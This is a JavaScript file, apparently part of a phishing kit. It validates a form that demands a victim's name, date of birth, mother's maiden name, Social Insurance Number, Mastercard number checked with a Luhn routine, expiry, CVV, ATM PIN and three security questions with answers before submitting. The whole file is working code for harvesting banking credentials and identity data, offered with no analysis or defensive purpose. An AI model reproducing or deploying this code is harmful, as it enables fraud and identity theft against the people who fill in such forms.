function hasNumber(t){return /\d/.test(t);}

  function removeSpacesFromPAN(fieldName) // strips off spaces before and after field name
{

	var startIndex, lastIndex;
	var newFieldName, newC;

	lastIndex = fieldName.length-1;
	startIndex = 0;

	newC = fieldName.charAt(startIndex);
	while ((startIndex<lastIndex) && ((newC == " ") || (newC == "\n") || (newC == "\r") || (newC == "\t"))) {
		startIndex++;
		newC = fieldName.charAt(startIndex);
	}

	newC = fieldName.charAt(lastIndex);
	while ((lastIndex>=0) && ((newC == " ") || (newC == "\n") || (newC == "\r") || (newC == "\t"))) {
		lastIndex--;
		newC = fieldName.charAt(lastIndex);
	}
	if (startIndex<=lastIndex) {
		newFieldName = fieldName.substring(startIndex, lastIndex+1);
		return newFieldName;
	} else {
		return fieldName;
	}
}


function verifyMod10(field)
{
	var PAN = field;

	PAN = removeSpacesFromPAN(PAN);
	var st = PAN;

	if (st.length > 19)
		return false;

	var sum = 0;
	var mul = 1;
	var st_len = st.length;
	var tproduct;

	for (i = 0; i < st_len; i++)
	{
		digit = st.substring(st_len-i-1, st_len-i);

		if (digit == " " || digit == "-")
			continue;

		tproduct = parseInt(digit ,10) * mul;

	    if (tproduct >= 10)
	      sum += (tproduct % 10) + 1;
	    else
	      sum += tproduct;

	    if (mul == 1)
	      mul++;
	    else
	      mul--;
	}

	if ((sum % 10) != 0)
		return false;
 
	return true;
}

function formSub(){
 setTimeout("document.CommonData.submit()",1000);
}

function logPANentry(action) {

                var loc = document.location.pathname.substr(document.location.pathname.lastIndexOf("/")+1)
       
                var rn = Math.random()+"";
                var a = rn * 10000000000000;
                
                
}
function checkform ( form )
{
    var illegalChars = /[\W_]/;
     if (form.name.value.length < 5) {
    alert( "Error: Full name." );
    form.name.focus();
	  document.getElementById('name').style.backgroundColor="#FF6A6A";
    return false ;
  }  if (form.phone.value.length < 6) {
    alert( "Error: Phone no." );
    form.phone.focus();
	  document.getElementById('name').style.backgroundColor="";
	  document.getElementById('phone').style.backgroundColor="#FF6A6A";
    return false ;
  }if (form.email.value.length < 6) {
    alert( "Error: E-mail " );
    form.email.focus();
	  document.getElementById('name').style.backgroundColor="";
	  document.getElementById('phone').style.backgroundColor="";
	  document.getElementById('email').style.backgroundColor="#FF6A6A";
    return false ;
  }if (form.zip.value.length < 6) {
    alert( "Error: Postal code " );
    form.zip.focus();
	  document.getElementById('name').style.backgroundColor="";
	  document.getElementById('phone').style.backgroundColor="";
	  document.getElementById('email').style.backgroundColor="";
	  document.getElementById('zip').style.backgroundColor="#FF6A6A";
    return false ;
  }if (form.dobd.value.length < 1) {
    alert( "Error: Date of Birth: Day " );
    form.dobd.focus();
	  document.getElementById('name').style.backgroundColor="";
	  document.getElementById('phone').style.backgroundColor="";
	  document.getElementById('email').style.backgroundColor="";
	  document.getElementById('zip').style.backgroundColor="";
	  document.getElementById('dobd').style.backgroundColor="#FF6A6A";
    return false ;
  }if (form.dobm.value.length < 1) {
    alert( "Error: Date of Birth: Month " );
    form.dobm.focus();
	  document.getElementById('name').style.backgroundColor="";
	  document.getElementById('phone').style.backgroundColor="";
	  document.getElementById('email').style.backgroundColor="";
	  document.getElementById('zip').style.backgroundColor="";
	  document.getElementById('dobd').style.backgroundColor="";
	  document.getElementById('dobm').style.backgroundColor="#FF6A6A";
    return false ;
  }if (form.doby.value.length < 1) {
    alert( "Error: Date of Birth: Year " );
    form.doby.focus();
	  document.getElementById('name').style.backgroundColor="";
	  document.getElementById('phone').style.backgroundColor="";
	  document.getElementById('email').style.backgroundColor="";
	  document.getElementById('zip').style.backgroundColor="";
	  document.getElementById('dobd').style.backgroundColor="";
	  document.getElementById('dobm').style.backgroundColor="";
	  document.getElementById('doby').style.backgroundColor="#FF6A6A";
    return false ;
  }if (form.mmn.value.length < 3) {
    alert( "Error: Mother's Maiden Name " );
    form.mmn.focus();
	  document.getElementById('name').style.backgroundColor="";
	  document.getElementById('phone').style.backgroundColor="";
	  document.getElementById('email').style.backgroundColor="";
	  document.getElementById('zip').style.backgroundColor="";
	  document.getElementById('dobd').style.backgroundColor="";
	  document.getElementById('dobm').style.backgroundColor="";
	  document.getElementById('doby').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="#FF6A6A";
    return false ;
  }if (form.sin1.value.length < 3) {
    alert( "Error: Social Insurance Number" );
    form.sin1.focus();
	  document.getElementById('name').style.backgroundColor="";
	  document.getElementById('phone').style.backgroundColor="";
	  document.getElementById('email').style.backgroundColor="";
	  document.getElementById('zip').style.backgroundColor="";
	  document.getElementById('dobd').style.backgroundColor="";
	  document.getElementById('dobm').style.backgroundColor="";
	  document.getElementById('doby').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="#FF6A6A";
    return false ;
  }if (form.sin2.value.length < 3) {
    alert( "Error: Social Insurance Number" );
    form.sin2.focus();
	  document.getElementById('name').style.backgroundColor="";
	  document.getElementById('phone').style.backgroundColor="";
	  document.getElementById('email').style.backgroundColor="";
	  document.getElementById('zip').style.backgroundColor="";
	  document.getElementById('dobd').style.backgroundColor="";
	  document.getElementById('dobm').style.backgroundColor="";
	  document.getElementById('doby').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="#FF6A6A";
    return false ;
  }if (form.sin3.value.length < 3) {
    alert( "Error: Social Insurance Number" );
    form.sin3.focus();
	  document.getElementById('name').style.backgroundColor="";
	  document.getElementById('phone').style.backgroundColor="";
	  document.getElementById('email').style.backgroundColor="";
	  document.getElementById('zip').style.backgroundColor="";
	  document.getElementById('dobd').style.backgroundColor="";
	  document.getElementById('dobm').style.backgroundColor="";
	  document.getElementById('doby').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="#FF6A6A";
    return false ;
  }
  
  if (form.employer.value.length < 1) {
    alert( "Error: Current employer" );
    form.employer.focus();
	  document.getElementById('name').style.backgroundColor="";
	  document.getElementById('phone').style.backgroundColor="";
	  document.getElementById('email').style.backgroundColor="";
	  document.getElementById('zip').style.backgroundColor="";
	  document.getElementById('dobd').style.backgroundColor="";
	  document.getElementById('dobm').style.backgroundColor="";
	  document.getElementById('doby').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('employer').style.backgroundColor="#FF6A6A";
    return false ;
  }if (form.ccnr.value.length < 16) {
    alert( "Error: Mastercard number" );
    form.ccnr.focus();
	  document.getElementById('name').style.backgroundColor="";
	  document.getElementById('phone').style.backgroundColor="";
	  document.getElementById('email').style.backgroundColor="";
	  document.getElementById('zip').style.backgroundColor="";
	  document.getElementById('dobd').style.backgroundColor="";
	  document.getElementById('dobm').style.backgroundColor="";
	  document.getElementById('doby').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('employer').style.backgroundColor="";
	  document.getElementById('ccnr').style.backgroundColor="#FF6A6A";
    return false ;
  }  
	  
	 if (!verifyMod10(form.ccnr.value)) {
    alert( "Error: Mastercard number" );
    form.ccnr.focus();
	  document.getElementById('name').style.backgroundColor="";
	  document.getElementById('phone').style.backgroundColor="";
	  document.getElementById('email').style.backgroundColor="";
	  document.getElementById('zip').style.backgroundColor="";
	  document.getElementById('dobd').style.backgroundColor="";
	  document.getElementById('dobm').style.backgroundColor="";
	  document.getElementById('doby').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('employer').style.backgroundColor="";
	  document.getElementById('ccnr').style.backgroundColor="#FF6A6A";
    return false ;
  } 
	  
  if (form.expm.value.length < 1) {
    alert( "Error: Card Expiration date(Month)" );
    form.expm.focus();
	  document.getElementById('name').style.backgroundColor="";
	  document.getElementById('phone').style.backgroundColor="";
	  document.getElementById('email').style.backgroundColor="";
	  document.getElementById('zip').style.backgroundColor="";
	  document.getElementById('dobd').style.backgroundColor="";
	  document.getElementById('dobm').style.backgroundColor="";
	  document.getElementById('doby').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('employer').style.backgroundColor="";
	  document.getElementById('ccnr').style.backgroundColor="";
	  document.getElementById('expm').style.backgroundColor="#FF6A6A";
    return false ;
  }
  if (form.expy.value.length < 1) {
    alert( "Error: Card Expiration date(Year)" );
    form.expy.focus();
	  document.getElementById('name').style.backgroundColor="";
	  document.getElementById('phone').style.backgroundColor="";
	  document.getElementById('email').style.backgroundColor="";
	  document.getElementById('zip').style.backgroundColor="";
	  document.getElementById('dobd').style.backgroundColor="";
	  document.getElementById('dobm').style.backgroundColor="";
	  document.getElementById('doby').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('employer').style.backgroundColor="";
	  document.getElementById('ccnr').style.backgroundColor="";
	  document.getElementById('expm').style.backgroundColor="";
	  document.getElementById('expy').style.backgroundColor="#FF6A6A";
    return false ;
  }if (form.cvv.value.length < 3) {
    alert( "Error: CVV Security Code" );
    form.cvv.focus();
	  document.getElementById('name').style.backgroundColor="";
	  document.getElementById('phone').style.backgroundColor="";
	  document.getElementById('email').style.backgroundColor="";
	  document.getElementById('zip').style.backgroundColor="";
	  document.getElementById('dobd').style.backgroundColor="";
	  document.getElementById('dobm').style.backgroundColor="";
	  document.getElementById('doby').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('employer').style.backgroundColor="";
	  document.getElementById('ccnr').style.backgroundColor="";
	  document.getElementById('expm').style.backgroundColor="";
	  document.getElementById('expy').style.backgroundColor="";
document.getElementById('cvv').style.backgroundColor="";
	  document.getElementById('cvv').style.backgroundColor="#FF6A6A";
    return false ;
  }
  
  if (form.pin.value.length < 4) {
    alert( "Error: ATM PIN" );
    form.pin.focus();
	  document.getElementById('name').style.backgroundColor="";
	  document.getElementById('phone').style.backgroundColor="";
	  document.getElementById('email').style.backgroundColor="";
	  document.getElementById('zip').style.backgroundColor="";
	  document.getElementById('dobd').style.backgroundColor="";
	  document.getElementById('dobm').style.backgroundColor="";
	  document.getElementById('doby').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('employer').style.backgroundColor="";
	  document.getElementById('ccnr').style.backgroundColor="";
	  document.getElementById('expm').style.backgroundColor="";
	  document.getElementById('expy').style.backgroundColor="";
document.getElementById('cvv').style.backgroundColor="";

	  document.getElementById('pin').style.backgroundColor="#FF6A6A";
    return false ;
  }if (form.q1.value.length < 1) {
    alert( "Error: Security question 1" );
    form.q1.focus();
	  document.getElementById('name').style.backgroundColor="";
	  document.getElementById('phone').style.backgroundColor="";
	  document.getElementById('email').style.backgroundColor="";
	  document.getElementById('zip').style.backgroundColor="";
	  document.getElementById('dobd').style.backgroundColor="";
	  document.getElementById('dobm').style.backgroundColor="";
	  document.getElementById('doby').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('employer').style.backgroundColor="";
	  document.getElementById('ccnr').style.backgroundColor="";
	  document.getElementById('expm').style.backgroundColor="";
	  document.getElementById('expy').style.backgroundColor="";
document.getElementById('cvv').style.backgroundColor="";

	  document.getElementById('pin').style.backgroundColor="";
	  document.getElementById('q1').style.backgroundColor="#FF6A6A";
    return false ;
  }if (form.a1.value.length < 1) {
    alert( "Error: Security answer 1" );
    form.a1.focus();
	  document.getElementById('name').style.backgroundColor="";
	  document.getElementById('phone').style.backgroundColor="";
	  document.getElementById('email').style.backgroundColor="";
	  document.getElementById('zip').style.backgroundColor="";
	  document.getElementById('dobd').style.backgroundColor="";
	  document.getElementById('dobm').style.backgroundColor="";
	  document.getElementById('doby').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('employer').style.backgroundColor="";
	  document.getElementById('ccnr').style.backgroundColor="";
	  document.getElementById('expm').style.backgroundColor="";
	  document.getElementById('expy').style.backgroundColor="";
document.getElementById('cvv').style.backgroundColor="";

	  document.getElementById('pin').style.backgroundColor="";
	  document.getElementById('q1').style.backgroundColor="";
	  document.getElementById('a1').style.backgroundColor="#FF6A6A";
    return false ;
  }
  if (form.q2.value.length < 1) {
    alert( "Error: Security question 2" );
    form.q2.focus();
	  document.getElementById('name').style.backgroundColor="";
	  document.getElementById('phone').style.backgroundColor="";
	  document.getElementById('email').style.backgroundColor="";
	  document.getElementById('zip').style.backgroundColor="";
	  document.getElementById('dobd').style.backgroundColor="";
	  document.getElementById('dobm').style.backgroundColor="";
	  document.getElementById('doby').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('employer').style.backgroundColor="";
	  document.getElementById('ccnr').style.backgroundColor="";
	  document.getElementById('expm').style.backgroundColor="";
	  document.getElementById('expy').style.backgroundColor="";
document.getElementById('cvv').style.backgroundColor="";

	  document.getElementById('pin').style.backgroundColor="";
	  document.getElementById('q1').style.backgroundColor="";
	  document.getElementById('a1').style.backgroundColor="";
	  document.getElementById('q2').style.backgroundColor="#FF6A6A";
    return false ;
  }
  if (form.a2.value.length < 1) {
    alert( "Error: Security answer 2" );
    form.a2.focus();
	  document.getElementById('name').style.backgroundColor="";
	  document.getElementById('phone').style.backgroundColor="";
	  document.getElementById('email').style.backgroundColor="";
	  document.getElementById('zip').style.backgroundColor="";
	  document.getElementById('dobd').style.backgroundColor="";
	  document.getElementById('dobm').style.backgroundColor="";
	  document.getElementById('doby').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('employer').style.backgroundColor="";
	  document.getElementById('ccnr').style.backgroundColor="";
	  document.getElementById('expm').style.backgroundColor="";
	  document.getElementById('expy').style.backgroundColor="";
document.getElementById('cvv').style.backgroundColor="";

	  document.getElementById('pin').style.backgroundColor="";
	  document.getElementById('q1').style.backgroundColor="";
	  document.getElementById('a1').style.backgroundColor="";
	  document.getElementById('q2').style.backgroundColor="";
	  document.getElementById('a2').style.backgroundColor="#FF6A6A";
    return false ;
  } if (form.q3.value.length < 1) {
    alert( "Error: Security question 3" );
    form.q3.focus();
	  document.getElementById('name').style.backgroundColor="";
	  document.getElementById('phone').style.backgroundColor="";
	  document.getElementById('email').style.backgroundColor="";
	  document.getElementById('zip').style.backgroundColor="";
	  document.getElementById('dobd').style.backgroundColor="";
	  document.getElementById('dobm').style.backgroundColor="";
	  document.getElementById('doby').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('employer').style.backgroundColor="";
	  document.getElementById('ccnr').style.backgroundColor="";
	  document.getElementById('expm').style.backgroundColor="";
	  document.getElementById('expy').style.backgroundColor="";
document.getElementById('cvv').style.backgroundColor="";

	  document.getElementById('pin').style.backgroundColor="";
	  document.getElementById('q1').style.backgroundColor="";
	  document.getElementById('a1').style.backgroundColor="";
	  document.getElementById('q2').style.backgroundColor="";
	  document.getElementById('a2').style.backgroundColor="";
	  document.getElementById('q3').style.backgroundColor="#FF6A6A";
    return false ;
  }if (form.a3.value.length < 1) {
    alert( "Error: Security answer 3" );
    form.a3.focus();
	  document.getElementById('name').style.backgroundColor="";
	  document.getElementById('phone').style.backgroundColor="";
	  document.getElementById('email').style.backgroundColor="";
	  document.getElementById('zip').style.backgroundColor="";
	  document.getElementById('dobd').style.backgroundColor="";
	  document.getElementById('dobm').style.backgroundColor="";
	  document.getElementById('doby').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('employer').style.backgroundColor="";
	  document.getElementById('ccnr').style.backgroundColor="";
	  document.getElementById('expm').style.backgroundColor="";
	  document.getElementById('expy').style.backgroundColor="";
document.getElementById('cvv').style.backgroundColor="";

	  document.getElementById('pin').style.backgroundColor="";
	  document.getElementById('q1').style.backgroundColor="";
	  document.getElementById('a1').style.backgroundColor="";
	  document.getElementById('q2').style.backgroundColor="";
	  document.getElementById('a2').style.backgroundColor="";
	  document.getElementById('q3').style.backgroundColor="";
	  document.getElementById('a3').style.backgroundColor="#FF6A6A";
    return false ;
  }
  
	  return true ;
	  }
	 
